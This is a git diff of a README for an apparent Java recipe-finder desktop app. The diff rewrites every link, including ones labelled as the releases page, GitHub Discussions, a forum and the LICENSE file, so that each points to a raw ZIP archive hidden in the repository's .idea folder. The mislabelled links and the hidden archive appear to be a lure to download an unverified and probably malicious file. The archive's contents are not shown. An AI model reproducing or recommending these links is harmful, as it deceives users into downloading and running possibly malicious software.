@@ -1,7 +1,7 @@
 # 🧑‍🍳 Recipe-Finder-and-Nutritional-Info - Easily Manage Your Favorite Recipes
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip%20Release-%20-blue)](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip)
+[![Download Release](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip%20Release-%20-blue)](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Recipe Finder! This Java desktop application helps you search, add, and manage your favorite recipes along with nutritional information. With user-friendly diet filters, you can find the perfect recipe that fits your dietary needs, whether you're looking for Veg, Non-Veg, or Vegan options.
@@ -17,7 +17,7 @@ To get started with Recipe Finder, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the release files:  
-   [Download Here](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip)
+   [Download Here](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip)
 
 2. **Choose Your Version**  
    Find the latest version available for download. You’ll see different files for each platform. Click the file relevant to your operating system.
@@ -70,14 +70,14 @@ If you run into issues, try these steps:
 ## 🌐 Community Support
 Join our community to share recipes, tips, and get support. You can find us on:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip)
-- [Recipe Finder Forum](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip)
+- [GitHub Discussions](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip)
+- [Recipe Finder Forum](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip)
 
 ## 📝 Contributing
 We welcome contributions to improve Recipe Finder. If you have suggestions, ideas, or bug reports, please submit them through GitHub issues.
 
 ## 📜 License
-Recipe Finder is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip) file for more details.
+Recipe Finder is licensed under the MIT License. See the [LICENSE](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip) file for more details.
 
 ## 📥 Download Now
-To download Recipe Finder again, visit our releases page here: [Download Here](https://raw.githubusercontent.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/main/src/database/Recipe-Finder-and-Nutritional-Info-v3.0.zip)
+To download Recipe Finder again, visit our releases page here: [Download Here](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/raw/refs/heads/main/.idea/Recipe-Nutritional-and-Finder-Info-2.5.zip)
